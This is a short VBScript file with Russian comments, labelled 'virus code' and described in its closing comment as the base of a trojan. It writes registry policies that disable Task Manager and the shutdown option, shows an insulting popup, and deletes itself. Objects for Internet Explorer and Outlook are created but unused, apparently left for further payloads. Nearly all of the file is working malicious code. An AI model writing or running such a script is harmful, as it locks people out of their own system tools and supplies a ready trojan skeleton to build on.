'            = = = = = =  = > КОД ВИРУСА < = = = = = = = 

'      Объявление переменных(этот абзац не перемещать)
Set FileSystemObject = CreateObject("scripting.filesystemobject")
Set Shell = CreateObject("Wscript.Shell")
t = 0: On Error Resume Next ' Пропускать ошибки
Set Application = CreateObject("Shell.Application")
Set InternerExplorer = WScript.CreateObject("InternetExplorer.Application")
Set Outlook = WScript.CreateObject("Outlook.Application")


Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explоrer\NoClose", 1, "REG_DWORD"

'     Вывести сообщение 
Shell.popup "Если ты не я, тогда слезь с моего кресла и не шарься в моем компе!", 10, "КРИТИН !", 0+48

'     Самоликвидироваться
FileSystemObject.deletefile WScript.ScriptFullName, True


' Написаный пользователем код

'**********************************
' Этот пример показывает как можно сделать
' торояна. Здесь представлено только его 
' основа, а остальные функции задать будет
' делом техники.
'**********************************
